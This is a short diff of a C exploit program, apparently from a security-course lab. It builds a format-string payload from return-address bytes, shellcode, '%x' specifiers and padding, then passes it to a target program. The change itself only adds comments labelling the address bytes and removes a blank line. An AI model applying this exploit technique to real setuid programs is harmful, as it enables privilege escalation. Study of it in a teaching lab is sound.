@@ -16,10 +16,10 @@ int main(void) {
   char *args[3];
   char *env[1];
 
-  char buf[481] = "\x9c\xfc\xff\xbf"
-                  "\x9d\xfc\xff\xbf"
-                  "\x9e\xfc\xff\xbf"
-                  "\x9f\xfc\xff\xbf";
+  char buf[481] = "\x9c\xfc\xff\xbf"  // ret
+                  "\x9d\xfc\xff\xbf"  // ret + 1
+                  "\x9e\xfc\xff\xbf"  // ret + 2
+                  "\x9f\xfc\xff\xbf"; // ret + 3
   strcpy(buf + strlen(buf), shellcode);
   strcpy(buf + strlen(buf), "%x%x%x");
 
@@ -30,7 +30,6 @@ int main(void) {
   write_with_padding(buf, 0x1bf - 0xff);
 
   memset(buf + strlen(buf), 'A', sizeof(buf) - strlen(buf));
-
   buf[480] = 0;
 
   args[0] = TARGET;
